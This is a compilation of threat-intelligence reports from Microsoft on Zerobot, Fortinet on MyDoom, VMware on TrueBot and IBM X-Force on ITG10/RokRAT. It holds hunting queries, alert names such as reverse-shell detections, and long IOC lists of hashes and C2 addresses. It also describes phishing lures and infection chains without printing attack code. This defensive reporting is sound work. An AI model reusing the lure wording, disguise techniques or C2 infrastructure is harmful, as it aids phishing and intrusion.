Microsoft Defender for Endpoint Microsoft Defender for Endpoint alerts with the following titles can indicate threat activity on your network: DEV-1061 threat activity group detected An active ‘PrivateLoader’ malware process was detected while executing ‘Morila’ malware was prevented ‘Multiverze’ malware was detected Microsoft Defender for Endpoint also has detections for the following vulnerabilities exploited by Zerobot: CVE-2022-22965 (Spring4Shell) Microsoft Defender for Endpoint’s Device Discovery capabilities discover and classify devices.
With these capabilities, Microsoft 365 Defender customers using Microsoft Defender for IoT have visibility into security recommendations for devices with the following vulnerabilities: CVE-2014-8361 CVE-2019-10655 CVE-2020-25506 CVE-2021-36260 CVE-2021-42013 CVE-2022-30525 CVE-2022-31137 CVE-2022-37061 Devices with these vulnerabilities are also visible in the Microsoft Defender Vulnerability Management inventory. 
Microsoft Defender for Cloud Microsoft Defender for Cloud alerts with the following titles can indicate threat activity on your network: VM_ReverseShell VM_SuspectDownloadArtifacts SQL.VM_ShellExternalSourceAnomaly AppServices_CurlToDisk Advanced hunting queries Microsoft 365 Defender Microsoft 365 Defender customers can run the following query to find related activity in their networks. 
Zerobot files This query finds the file hashes associated with Zerobot activity. 
let IoCList = externaldata(TimeGenerated:datetime,IoC:string,IoC_Type:string,ExpirationDateTime:datetime,Description:string, Action:string, ConfidenceScore:real, ThreatType:string, Active:string,Type:string, TrafficLightProtocolLevel:string, ActivityGroupNames:string)[@"https://raw.githubusercontent.com/microsoft/mstic/master/RapidReleaseTI/Indicators.csv"] with(format="csv", ignoreFirstRecord=True); let shahashes = IoCList | where IoC_Type =~ "sha256" and Description =~ "Dev-1061 Zerobot affecting IoT devices" | distinct IoC; DeviceFileEvents | where SHA256 in (shahashes) Zerobot HTTP requests This query finds suspicious HTTP requests originated by the IOCs associated with Zerobot activity. 
DeviceNetworkEvents | where RemoteIP in("176.65.137.5","176.65.137.6") | where ActionType == "NetworkSignatureInspected" | where Timestamp > ago(30d) |extend json = parse_json(AdditionalFields) | extend SignatureName =tostring(json.SignatureName), SignatureMatchedContent = tostring(json.SignatureMatchedContent), SignatureSampleContent = tostring(json.
SamplePacketContent) |where SignatureName
== "HTTP_Client" |project Timestamp, DeviceId, DeviceName, RemoteIP, RemotePort, LocalIP, LocalPort, SignatureName, SignatureMatchedContent, SignatureSampleContent Zerobot port knocking This query finds incoming connections from IOCs associated with Zerobot activity. 
DeviceNetworkEvents | where RemoteIP in("176.65.137.5","176.65.137.6") | where ActionType == "InboundConnectionAccepted" | where Timestamp > ago(30d) |project Timestamp, DeviceId, DeviceName, RemoteIP, RemotePort, LocalIP, LocalPort, InitiatingProcessFileName Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.
If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy Indicators of compromise (IOCs): Domains and IP addresses: zero[.]sudolite[.]ml 176.65.137[.]5 176.65.137[.]5:1401 176.65.137[.]6 ws[:]//176.65.137[.]5/handle http[:]//176.65.137[.]5:8000/ws New Zerobot hashes (SHA-256) aed95a8f5822e9b1cd1239abbad29d3c202567afafcf00f85a65df4a365bedbb bf582b5d470106521a8e7167a5732f7e3a4330d604de969eb8461cbbbbdd9b9a 0a5eebf19ccfe92a2216c492d6929f9cac72ef37089390572d4e21d0932972c8 
1e7ca210ff7bedeefadb15a9ec5ea68ad9022d0c6f41c4e548ec2e5927026ba4 05b7517cb05fe1124dd0fad4e85ddf0fe65766a4c6c9986806ae98a427544e9d 5625d41f239e2827eb05bfafde267109549894f0523452f7a306b53b90e847f2 c304a9156a032fd451bff49d75b0e9334895604549ab6efaab046c5c6461c8b3 66c76cfc64b7a5a06b6a26976c88e24e0518be3554b5ae9e3475c763b8121792 539640a482aaee2fe743502dc59043f11aa8728ce0586c800193e30806b2d0e5 0f0ba8cc3e46fff0eef68ab5f8d3010241e2eea7ee795e161f05d32a0bf13553 343c9ca3787bf763a70ed892dfa139ba69141b61c561c128084b22c16829c5af 874b0691378091a30d1b06f2e9756fc7326d289b03406023640c978ff7c87712 29eface0054da4cd91c72a0b2d3cda61a02831b4c273e946d7e106254a6225a7 4a4cb8516629c781d5557177d48172f4a7443ca1f826ea2e1aa6132e738e6db2 bdfd89bdf6bc2de5655c3fe5f6f4435ec4ad37262e3cc72d8cb5204e1273ccd6 62f23fea8052085d153ac7b26dcf0a15fad0c27621f543cf910e37f8bf822e0e 788e15fd87c45d38629e3e715b0cb93e55944f7c4d59da2e480ffadb6b981571 26e68684f5b76d9016d4f02b8255ff52d1b344416ffc19a2f5c793ff1c2fdc65 e4840c5ac2c2c2170d00feadb5489c91c2943b2aa13bbec00dbcffc4ba8dcc2d 45059f26e32da95f4bb5dababae969e7fceb462cdeadf7d141c39514636b905a 77dd28a11e3e4260b9a9b60d58cb6aaaf2147da28015508afbaeda84c1acfe70 cf232e7d39094c9ba04b9713f48b443e9d136179add674d62f16371bf40cf8c8 13657b64a2ac62f9d68aeb75737cca8f2ab9f21e4c38ce04542b177cb3a85521 eb33c98add35f6717a3afb0ab2f9c0ee30c6f4e0576046be9bf4fbf9c5369f71 e3dd20829a34caab7f1285b730e2bb0c84c90ac1027bd8e9090da2561a61ab17 3685d000f6a884ca06f66a3e47340e18ff36c16b1badb80143f99f10b8a33768 cdc28e7682f9951cbe2e55dad8bc2015c1591f89310d8548c0b7a1c65dbefae3 869f4fb3f185b2d1231d9378273271ddfeebb53085daede89989f9cc8d364f5f 6c59af3ed1a616c238ee727f6ed59e962db70bc5a418b20b24909867eb00a9d6 ef28ee3301e97eefd2568a3cb4b0f737c5f31983710c75b70d960757f2def74e 95e4cc13f8388c195a1220cd44d26fcb2e10b7b8bfc3d69efbc51beb46176ff1 62f9eae8a87f64424df90c87dd34401fe7724c87a394d1ba842576835ab48afc 54d1daf58ecd4d8314b791a79eda2258a69d7c69a5642b7f5e15f2210958bdce 8176991f355db10b32b7562d1d4f7758a23c7e49ed83984b86930b94ccc46ab3 8aa89a428391683163f0074a8477d554d6c54cab1725909c52c41db2942ac60f fd65bd8ce671a352177742616b5facc77194cccec7555a2f90ff61bad4a7a0f6 1e66ee40129deccdb6838c2f662ce33147ad36b1e942ea748504be14bb1ee0ef 57f83ca864a2010d8d5376c68dc103405330971ade26ac920d6c6a12ea728d3d 7bfd0054aeb8332de290c01f38b4b3c6f0826cf63eef99ddcd1a593f789929d6 SparkRat hashes (SHA-256): 0ce7bc2b72286f236c570b1eb1c1eacf01c383c23ad76fd8ca51b8bc123be340 cacb77006b0188d042ce95e0b4d46f88828694f3bf4396e61ae7c24c2381c9bf 65232e30bb8459961a6ab2e9af499795941c3d06fdd451bdb83206a00b1b2b88 Rotem Sde-Or, Ilana Sivan, Gil Regev, Microsoft Defender for IoT Research TeamMeitar Pinto, Nimrod Roimy, Nir Avnery, Microsoft Defender Research TeamRamin Nafisi, Ross Bevington, Microsoft Threat Intelligence Center (MSTIC) 
title: Just Because It’s Old Doesn’t Mean You Throw It Away (Including Malware!) 
url: https://www.fortinet.com/blog/threat-research/just-because-its-old-doesnt-mean-you-throw-it-away-including-malware Art, automobiles, and wine are often associated with things that appreciate in value as they age.
Malware isn’t usually thought of this way, as most threat actors strive to keep their tools as current as possible with new lures and exploitation techniques. 
However, every once in a while, a campaign appears that turns this paradigm on its head.
FortiGuard Labs came across one such recent campaign using the MyDoom worm. 
MyDoom (also known as Novarg and Mimail) was first discovered back in 2004.
And while it has seen some updates and modifications since its introduction, it is an anachronism in the malware world that continues to operate well beyond expectations. 
Affected Platforms: WindowsImpacted Users: Windows usersImpact: Potential to deploy additional malware for additional purposesSeverity Level: Medium Typical phishing e-mail The typical MyDoom phishing e-mail contains subjects referencing a delivery error or testing.
Email headers contain a rejection reason and a custom “Content-Type”.
There is also an attachment that may or may not be zipped.
This attachment (unless zipped) is the MyDoom executable. 
FortiGuard Labs encountered the following message subjects in our recent investigation: Click me baby, one more time RETURNED MAIL: SEE TRANSCRIPT FOR DETAILS Isnydosj anhr ayownizdiitis Delivery failed Test Delivery reports about your e-mail Status Returned mail: Data format error RETURNED MAIL:
DATA FORMAT ERROR Returned mail: see transcript for details Mail System Error - Returned Mail The following attachment names were also found to be used repeatedly: document.zip transcript.zip letter.zip attachment.zip .zip message.zip message.scr golfasian.com readme.scr mail.zip text.cmd <random number>@7686f6a96.com file.zip attachment.scr Typical attachment The MyDoom executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.).
This increases the chances that users won’t identify it as malicious. 
Despite the extension, the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze. 
With that being said, UPX has been around for quite some time.
When used without modification, it is quite easy to decompress the original executable using the tool itself. 
MyDoom Unpacked The packer decompresses and executes the actual MyDoom code.
Upon execution, an attempt to alter the Windows firewall settings is made. 
A user logged on to the system would see a request to grant access for the executable to communicate out through the Firewall. 
MyDoom next makes a copy of itself, places it in the “Temp” folder (C:\Users\<user>\AppData\Local\Temp), and changes the name to a known Windows application/process.
In this case, it used “lsass.exe”. 
It also creates a file full of garbage text that is not referenced again once created. 
MyDoom communicates over port 1042 to both send and receive. 
It rotates through a number of possible C2 domains in an attempt to locate an active one.
As part of the legacy of spreading through file-sharing utilities, MyDoom also litters the “C:\Program Files\Common Files\Microsoft
Shared” folder with multiple versions of itself.
It renames itself as some now very old and obsolete applications (e.g., Kazaa Lite) with a random name or phrase attached. 
Application names include: Kazaa Lite Harry Potter ICQ 4 Lite WinRAR.v.3.2 Winamp 5.0 (en) Crack Winamp 5.0 (en) Conclusion Despite its advanced age, there are still fresh infections of MyDoom occurring in the wild, along with corresponding phishing events.
This goes to show that even older malware can still be dangerous no matter their age Fortinet Protections Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services: FortiGuard customers are protected against this latest MyDoom campaign, which is blocked by FortiMail.
The following (AV) signature detects the malware samples mentioned in this blog W32/MyDoom.
M@mm W32/Mydoom.
E!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.
Customers running current AntiVirus updates are protected. 
The WebFiltering client blocks all network-based URIs. 
Fortinet has multiple solutions designed to help train users to understand and detect phishing threats, including the FortiPhish Phishing Simulation Service, which uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. 
In addition to these protections, we suggest that organizations have their end users undergo our FREE NSE training: NSE 1 – Information Security Awareness.
It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. 
IOCs File-based IOCs: Filename SHA256 9ed08@7686f6a96.com 5a6c1929f55baff2e786336c07f02c5d13194ff765073dcdfcae1b0cb53da5bc 5713a@7686f6a96.com 1b1e2421dc3d96a8b9dd58d9cc74730c966250df7c33a1e0df50d983e674b7bc atpysig.exe 6223e126a65ba888182d3369adacc7268bd78555f0426653f5b5dd963d4c31a4 attachment.doc.scr ad37758c362a38a8718837ece40ed5699e40de11ed58a586c2a6a6d8bb5251bf attachment.scr 9fc0179c7407476ced89b6124fa52f10d178f3a07e3d50c860b1ced98fb77541 attachment.doc.scr ad37758c362a38a8718837ece40ed5699e40de11ed58a586c2a6a6d8bb5251bf ATTACHMENT.SCR 1302161ca791b3fc01188582a075bbfcfeb5f28715ad527be0fe625ec452b1eb attachment.scr 9fc0179c7407476ced89b6124fa52f10d178f3a07e3d50c860b1ced98fb77541 ATTACHMENT.SCR 1302161ca791b3fc01188582a075bbfcfeb5f28715ad527be0fe625ec452b1eb document.doc 31fd079696a071a48fd4a66588adb22e36dd96028792fb416bcee0f099d6e5cb document.doc 5e99396cf134fea102470525d5105afb697b9131d891990e2dc8c9e5e34f8165 file.htm.scr 009ac15d56c3a5149f10c833b5cc191eede4d33485cab7bc3dd94675a462608c golfasian.com 9fcf4b0e00d20060274861b41b2c13b68dfedbd2ac0012436b13960b2a570d4f golfasian.com 34d9e11e71fe18f9eb290461714826e1069a129d44db25c6c4fe581f883cbc07 golfasian.com 
6155f0562adfaa75cf46f674cf094d3f23c27b38c8009b6982f48ca4e77c95b1 golfasian.com 92018aff6737899f94aed2461b6e4182383b6677be2e8d4f82098265d74fb913 html.pif eba7ec36cb9cc3c3677f5325ee9f755fefe885235849aede61a0b130a9f6255b html.pif d438e3ec7bd0fa4b231a6a1704d89f117d3b6b6ba342915b4d095027d0fe4c90 john2@golfasian.com a966f61a86dae4737f99d5b7668b0fcab3124125d2030faa08855ae12c9525ee letter.exe 48c70041def3bf288f7f85ee96eb59a2f7d965963a66e0c86fb3c88b3e079386 letter.scr 2ddc70753893167b7b5d15c1e3cf6f22b6d8a0ee8a4aaea93c40655608f6fc75 mail.html 20b372391f4d0fd9e4f69fc950456b557fab27f7bbbdeede36cff404e35614aa message.bat 7b596caceaf2e8a139c01eaf67e5e52ff3247ca6d20112ea9ce59a02a1a5bb7d message.scr 2744c29d98a144fabda0ac75264235cd82b798f3bd5a56fab2ad28ec218b94c8 Message.scr eb5bfbb3be5300c1231a8ece93d239b7a02a4f308d7efe85d604f06d3aca57ad readme.scr 8d4dcf463e7a69cd1b3039779d9d36c8a4669444b30d3261f876b7720bdb6752 text.cmd 5cb5efc8e0be0bf32eb73fbdaebedacf70cba946f5dfaea7166dcd0f4ca5989f tracy@golfasian.com c12e27b30706dd1d11e5822285e209a187724148a682d178f1e2bc3f8d670ea7 transcript.htm.pif 2ddc70753893167b7b5d15c1e3cf6f22b6d8a0ee8a4aaea93c40655608f6fc75 transcript.txt 6bbcc015c5a72b03601f8087c57024a7e74975dfb567b867c3404958e4239c9c txt.pif d599d4343fe3d831bcad8ea7305f050608a182f99636ea9e87c9400d19fae043 txt.scr f5dc449255319cebd38ce255060a8019e0f5697de8ac31353c7d067d9e1218e6 document.zip 11a86a2388c501773b52ae79ee1f7504caca6c25d835d40b8afc9ebe29c7a26d .zip 942ef9da07de7d70c2efcfc20e375e6919a521d44ddabf9369042aea1553f712 message.zip 10502c24bb63af929da22ec306f44f9e557b4e3bbf588afd1a7f190aa9840938 letter.zip 21ee754775ca9f76b2d18d0b87722ffa0c9ab0f676e4aa6ac4881dff580087ac .zip 505b177a6c24c69a9fda1e78db7421fad4893d7c07e3cea91897decfbc4510be message.zip ad29b1c0423a878758a444ad6bf38aa2ad276a98f0ca552b475d890db631f48b file.zip 113db96ddc72fb3300e981c7691cd202d3d0a5b097e84cd41eee6a54d868bf31 transcript.zip 3df99ae8f2083419fd030c42ca6729b6e5319df6aca1204d7081ce6ea91c69da transcript.zip 04123ec908c4a60282fa35fed76a377b22a49b6f9bfaf5a81121fd7204b4b83d .zip 
4864f84ea0f6939751310a2cca43e71a57171f37679cb7853d29a083b1617a09 .zip 
35bb66f1cc9e820ef50c22d0abb0f5f7ba8724bebb4a5a795e68790943742928 .zip 9bf413a9d9b3b17767f0a93450f834947475765b2fd1ecccaa943f8ce9d58082 document.zip 9a2f837a8adb16632ce4ec3c8b02037a4e96e66e6737ef1169afb2e48e46aa6a letter.zip bfaf49a691792a29024a75119a9841caacefb306494ca011a42b46c12ca65895 .zip 59ad199d81590be7b83768227fe3a79b115f6c978b8715864ae0e22e5d324e36 mail.zip ecda9c446dd6aa0018cd5fc9c99ba846484f8d2a81d7f97167d89b890e4d5c1a attachment.zip e745cc1ae5a89a9f2b4b0eabbac342520703b03f68dafeb6d29194fe19e899e9 attachment.zip 1f442b9ff3c9225e3eaa9c74d16b3a74117bb66e1d372ca15b6154d386a93e57 Network-Based IOCs: IOC IOC type 15.244.197.9:1042 Attempted C2 Connection 141.240.203.6:1042 Attempted C2 Connection 16.115.197.163:1042 Attempted C2 Connection 67.120.102.206:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection 166.77.123.68:1042 Attempted C2 Connection 198.89.160.22:1042 Attempted C2 Connection 15.98.11.12:1042 Attempted C2 Connection 67.121.94.10:1042 Attempted C2 Connection 15.24.69.27:1042 Attempted C2 Connection 129.204.109.121:1042 Attempted C2 Connection 70.241.87.215:1042 Attempted C2 Connection 16.80.195.68:1042 Attempted C2 Connection 15.9.79.129:1042 Attempted C2 Connection 15.14.59.199:1042 Attempted C2 Connection 216.114.194.30:1042 Attempted C2 Connection 15.228.15.126:1042 Attempted C2 Connection 16.100.121.101:1042 Attempted C2 Connection 15.63.9.76:1042 Attempted C2 Connection 65.6.113.38:1042 Attempted C2 Connection 141.240.211.237:1042 Attempted C2 Connection 16.83.199.36:1042 Attempted C2 Connection 66.248.57.65:1042 Attempted C2 Connection 15.59.127.133:1042 Attempted C2 Connection 16.150.138.126:1042 Attempted C2 Connection 141.154.253.115:1042 Attempted C2 Connection 66.43.244.133:1042 Attempted C2 Connection 68.158.45.83:1042 Attempted C2 Connection 152.16.43.135:1042 Attempted C2 Connection 129.81.101.242:1042 Attempted C2 Connection 16.102.137.19:1042 Attempted C2 Connection 16.102.153.27:1042 Attempted C2 Connection 67.171.253.156:1042 Attempted C2 Connection 15.75.188.252:1042 Attempted C2 Connection 216.128.188.41:1042 Attempted C2 Connection 16.126.107.216:1042 Attempted C2 Connection 16.125.202.53:1042 Attempted C2 Connection 162.28.185.188:1042 Attempted C2 Connection 195.75.252.98:1042 Attempted C2 Connection 68.223.45.7:1042 Attempted C2 Connection 24.148.141.102:1042 Attempted C2 Connection 141.240.190.28:1042 Attempted C2 Connection 129.243.132.29:1042 Attempted C2 Connection 148.193.135.228:1042 Attempted C2 Connection 24.190.210.189:1042 Attempted C2 Connection 12.166.196.8:1042 Attempted C2 Connection 15.228.161.161:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection 
title: Carbon Black’s TrueBot Detection url: https://blogs.vmware.com/security/2023/06/carbon-blacks-truebot-detection.html VMware’s Carbon Black Managed Detection and Response (MDR) team began seeing a surge of TrueBot activity in May 2023.
TrueBot, otherwise known as Silence.
Downloader has been seen since at least 2017.
TrueBot is under active development by Silence, with recent versions using a Netwrix vulnerability for delivery.
In this article, we will break down what we have seen in customers’ environments and how Carbon Black MDR detects and responds to the threat. 
History Just as its name suggests, TrueBot is a downloader trojan botnet that uses command and control servers to collect information on compromised systems and uses that compromised system as a launching point for further attacks, as seen recently with Clop Ransomware. 
TrueBot was known for using malicious emails to drop their malware but was recently seen using a Netwrix vulnerability as their delivery method.
VMware’s MDR team has seen this vulnerability used firsthand in customer environments, as explored below.
TrueBot is also using Raspberry Robin (a worm) as a delivery vector. 
While Silence Group is known for targeting banks and financial institutions, TrueBot has also been seen targeting the education sector.
In the Carbon Black Detection & Notable Attacks section, we break down the sectors that we have seen targeted from our platform. 
Attribution Though a threat actor group called Silence Group is attributed to this malware, Group-IB has linked the group with Russia’s EvilCorp (Indrik Spider) due to the downloaders they use being similar.
The MDR team has explored this link and has not found substantial evidence to back this claim. 
Researchers thought EvilCorp to be linked to TrueBot due to TrueBot dropping FlawedGrace.
FlawedGrace is malware that is attributed to EvilCorp.
Though TrueBot drops this payload, the malware operators could purchase access to this tool directly from EvilCorp.
Another link explored was TrueBot dropping Clop Ransomware, which was previously used by EvilCorp.
However, Clop is ransomware-as-a-service, so anyone can purchase access to this tool.
Lastly, Silence is a Russian-speaking cybercriminal group that uses Russian web hosting services.
Though EvilCorp is also Russian, this is not strong evidence to link the two, as there are dozens of Russian APTs. 
Due to these findings, we cannot say for sure whether EvilCorp and TrueBot are connected. 
Carbon Black Detection Carbon Black is very effective at detecting TrueBot and its associated activity.
This section will focus on what Carbon Black detected and the visibility into the attack process. 
Figure 1.1 Process Chain 
The infection appeared to have started with a drive-by-download from Chrome for the executable ‘update.exe’. 
Figure 1.2 Update.exe being downloaded A user had to click on this in order to execute the malware.
Upon execution, the malware immediately begins to look for EDR and antivirus software. 
Figure 1.3 Looking for EDR/AV Once executed, it connected to 94[.]142.138.61IP, which is a Russian IP address that is known to be attributed to TrueBot.
At the address, the executable ‘3ujwy2rz7v.exe’ was downloaded and then launched by cmd.exe. 
Figure 1.4 3ujwy2rz7v.exe activity The executable then connected to the C2 domain name ‘dremmfyttrred[.]com’. 
The activity thereafter included dumps of LSASS, exfiltration of data, and system and process enumerations. 
Managed Detection and Response stops this activity through first the detection of the activity and then the implementation of system quarantines, hash banning, policy reviews, and policy modifications.
Customers are informed of the observed activity and actions taken by the team every step of the way. 
Indicators of Compromise 45.182.189[.]103 Dremmfyttrred.com 94.142.138[.]61 Locations: Russia, Panama Update.exe e8c342845a02608ecd1cca8ad409895bf530f6c2830b8af8b70a3d90e8b8d3da Document_26_apr_2443807.exe fe746402c74ac329231ae1b5dffa8229b509f4c15a0f5085617f14f0c1579040 172.64.155[.]188 104.18.32[.]68 3ujwy2rz7v.exe Summary TrueBot can be a particularly nasty infection for any network.
When an organization is infected with this malware, it can quickly escalate to become a bigger infection, similar to how ransomware spreads throughout a network.
Carbon Black is able to quickly detect TrueBot and its associated activity and, with the help of MDR, be able to detect and contain it early in the attack chain before the threat escalates. 
title: ITG10 Likely Targeting South Korean Entities of Interest to the Democratic People’s Republic of Korea (DPRK) url: https://securityintelligence.com/posts/itg10-targeting-south-korean-entities/ In late April 2023, IBM Security X-Force uncovered documents that are most likely part of a phishing campaign mimicking credible senders, orchestrated by a group X-Force refers to as ITG10, and aimed at delivering RokRAT malware, similar to what has been observed by others.
ITG10’s tactics, techniques and procedures (TTPs) overlap with APT37 and ScarCruft.
The initial delivery method is conducted via a LNK file, which drops two Windows shortcut files containing obfuscated PowerShell scripts in charge of downloading a second stage RokRAT shellcode.
RokRAT can execute remote C2 commands, data exfiltration, file download/upload, and keylogging.
The uncovered lure documents suggest ITG10 may be targeting individuals and organizations involved in foreign policy associated with the Korean peninsula. 
Key Findings: ITG10 likely targeting South Korean government, universities, think tanks, and dissidents Phishing emails spoof legitimate senders to deliver RokRAT via LNK files Email attachments mimic legitimate documents Additional malware samples possibly related to ITG10 RokRAT campaigns Decoy Documents In late April 2023, X-Force uncovered several Zip Archives files hosting multiple lure documents likely sent via phishing campaigns operated by ITG10. X-Force assesses that the documents are likely decoys geared toward various personnel within two subsets of activity: South Korean government, communication, and educational centers; and energy, manufacturing, and supply chain.
This section provides analysis of the lure documents and potential targets. 
South Korean Government, Communications and Educational Centers 
The first suspected subset of activity revealed Korean-language lure documents.
The first titled (0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip
[(0722) List of Standing Committee and Standing Special Committee members (final).zip)], contains charts listing the Standing Committee members and assignments associated with broadcast media in South Korea as of July 2022.
Examination of the contents suggests that it is a directory of eighteen South Korean parliamentary committee assignments, the number of committee members, their names, and political party affiliation.
Committees include Education and Judicial, International and Foreign Affairs, Defense, and Intelligence.
The intended targets for this lure are likely to be parliamentary members seeking information on their committee assignment or reporters covering parliament. 
(0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip 
An additional decoy document titled 계약서내용.pdf (Contract detail.pdf) appears to be associated with a national South Korean broadcaster.
The contents detail the company’s approach to radio drama production scheduled for broadcast in May 2023. 
North Korean sponsored threat actors have previously been known to create accounts posing as broadcasting scriptwriters to deceive watchers.
In 2021, North Korean threat actors compromised several email accounts of prominent defectors to send malicious documents to contacts working on DPRK issues.
ITG10 has also been known to infect news websites with malware likely to spy on readers. 
A third decoy 2023년도 4월 29일 세미나.pdf (April 29, 2023 Seminar.pdf) appears to be an itinerary for an event hosted in April 2023 by a South Korean think tank.
The event includes multiple seminars on political theory, military history, and a talk on “Intelligence activities and cyber security of the National Intelligence Service.”
Members of this think tank include professors from multiple universities and South Korean government entities.
There are two mobile phone numbers and a Zoom link with a password in the decoy document, which can be scraped to launch phishing material over social medial platforms.
Based on the document’s content, academic and government employees, especially those in intelligence and cybersecurity, are probable targets for phishing emails containing this type of decoy document. 
2023년도 4월 29일 세미나.pdf Energy, Manufacturing and Supply Chain The second grouping of lure documents features a zip file projects in Libya.zip containing a LNK file Pipelines Profile (Elfeel- Sharara-Mellitah + Wafa – Mellitah).lnk, as well as additional English-language decoy files.
The decoy files are a Microsoft Word Document and PDF copy of a document titled Proposed MOU GTE Korea.
The documents appear to be legitimate and establish a written Memorandum of Understanding (MOU) between an authentic privately owned Libyan energy company and a South Korean consulting firm specializing in energy, procurement, construction and finance (EPC&F).
In addition, the zip contains a second non-malicious lure PDF titled MFZ Executive Summary Korea detailing a feasibility study regarding the development and expansion of the “sea port free zone of Misurata.” 
Based on the decoy content, the likely recipients of this phishing campaign would be organizations or individuals involved with a construction project in the Middle East.
The Middle East has been a traditional customer for many large-scale construction projects for multiple South Korean companies, and there has been a recent push by the South Korean administration to what’s known as the ‘2nd construction boom’. 
These construction projects are part of the South Korean government’s pivot to the Middle East, deepening ties both militarily and economically. 
Sample Analysis RokRAT has been previously analyzed as having a multi-stage process with two components.
The first involves tooling, and the second involves the payload, likely to inhibit researchers from analyzing the final payload, while maintaining the ability to stop delivery once a target system is infected.
RokRAT campaigns typically begin with a phishing email with a ZIP file attachment, containing a LNK file disguised as a Word document.
When the LNK file is activated, a PowerShell script is executed, opening a decoy document to start the download process of RokRAT which is hosted at OneDrive or similar cloud application.
In another campaign, ITG10 was observed delivering RokRAT via HWP and Word files containing LNK files.
In X-Force’s analysis of recent RokRAT-related files, in lieu of a ZIP file, we found Optical Disc Image files (ISO) containing LNK files that had slightly modified PowerShell scripts, and Hangul Word Processor decoy documents (HWP). 
ISO Files The ISO files that X-Force observed contained a LNK file disguised as an exe icon, subsequently containing a HWP file, and a batch file.
The LNK file contains a PowerShell command, as seen below as an example.
Once the LNK file is executed, it extracts and drops a decoy file, and a batch file within the user’s %TEMP% folder.
In this instance, the files were 2023년도 4월 29일 세미나.pdf – decoy file, and 230415.bat. 
icon_location = C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe PowerShell Commands: Related Malware? 
While researching the RokRAT-related files, X-Force also uncovered three LNK files that behave differently than expected.
There is no use of OneDrive or similar cloud applications to host a second-stage payload, and instead of dropping a batch file, these LNK files drop VBS, with the obfuscation technique for the dropped files being hex-encoding vs. string concatenation.
In addition, the RokRAT LNK files drop batch files and downloads the payload that is decoded using the first byte as a key, then the payload is executed using Windows API functions (VirtualProtect).
With these additional LNK files, the VBS downloaders do not perform these actions. 
The LNK files analyzed contain an encoded PowerShell, and once the LNK files are executed, the PowerShell script is run, and two files are dropped to the user’s %TEMP% folder.
In one analyzed sample, the files dropped were a VBS file (tmp<random-9-digit-number>.vbs ), and a Plaintext file with contents asdfgqwert.
The VBS file will get executed via Wscript.exe: “C:\Windows\System32\WScript.exe” “C:\Users\Usuario\AppData\Local\Temp\tmp<nine-digit-number>.vbs”. 
Wscript.exe is a service Wscript.exe is a service provided by the Windows system with scripting abilities.
Subsequently, two GET requests are initiated.
In a third file we analyzed, instead of the LNK file dropping a VBS and a Plaintext file, a VBS file and a JPEG decoy file are dropped to the users %TEMPT% folder.
In this case, the JPEG decoy file appears to be a correspondence related to the “Proof of Digital Assets”.
At the time of this analysis, X-Force was unable to retrieve the final payload from the servers as they have been taken down; therefore, it is uncertain whether these additional LNK files are related to ITG10 activity.
Further research and analysis are needed to determine relevance and attribution. 
Encoded PowerShell: 
Decoded PowerShell: tmp1698268529.vbs GET Requests: Proof of Digital Assets JPEG X-Force Recommendations Multiple lure documents uncovered in this campaign suggest ITG10 continues to target individuals and organizations involved in foreign policy, potentially related to shifts in the geopolitical and security environment on the Korean peninsula.
IBM X-Force assesses with high confidence that individuals and organizations holding strategic, political, or military information in connection with the Korean peninsula will see elevated threats from the DPRK, given ITG10’s previous and recent activity. 
Organizations that may be at elevated risk of targeting from ITG10 have the potential to decrease the risk to their organization by employing heightened vigilance toward potential phishing emails, warning employees of the phishing email threats, employing and closely monitoring endpoint detection and response (EDR) tools, and leveraging behavioral analytics to identify malicious behavior.
We also recommend that potentially targeted organizations alert on the following indicators of compromise to detect behavior related to this campaign. 
Indicators of Compromise Indicator Indicator Type Context f92297c4efabba98befeb992a009462d1aba6f3c3a11210a7c054ff5377f0753 LNK 7ef2c0d2ace70fedfe5cd919ad3959c56e7e9177dcc0ee770a4af7f84da544f1 PDF Decoy 2023년도 4월 29일 세미나.pdf 06431a5d8f6262cc3db39d911a920f793fa6c648be94daf789c11cc5514d0c3d Batch File 230415.bat 1c5b9409243bfb81a5924881cc05f63a301a3a7ce214830c7a83aeb2485cc5c3 ZIP (0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip cb4c7037c7620e4ce3f8f43161b0ec67018c09e71ae4cea3018104153fbed286 LNK 5815a6f7976e993fcdf9e024f4667049ec5a921b7b93c8c8c0e5d779c8b72fcc HWP Decoy 0722.hwp 240e7bd805bd7f2d17217dd4cebc03ac37ee60b7fb1264655cfd087749db647a Batch File 202207221.bat 9854750f3880c7cee3281d8c33292ca82d0d288963f0f2771d938c06ccaffaa9 LNK ce56b011ac4663a40f0ba606c98c08aaf7caf6a45765aa930258fe2837b12181 PDF Decoy 계약서내용.pdf cc6ae9670e38244e439711b1698f0db3cff000b79bec7f47bc4aa5ab1f6177c0 Batch File 230422.bat 00d88009fa50bfab849593291cce20f8b2f2e2cf2428d9728e06c69fced55ed5 ZIP projects in Libya.zip 6753933cd54e4eba497c48d63c7418a8946b4b6c44170105d489d29f1fe11494 LNK Pipelines Profile (Elfeel- Sharara-Mellitah + Wafa – Mellitah).lnk f1289e7229ace984027f29cf8e2dd8fdd19b0c4b488da31ff411ee95305eaecc docx Proposed MOU GTE Korea.docx fa2ebcdfce8bbe4245ed77b43d39e22c0c7593ca3f65be3fd0ccdf7ee02130a9 PDF Decoy Proposed MOU GTE Korea.pdf 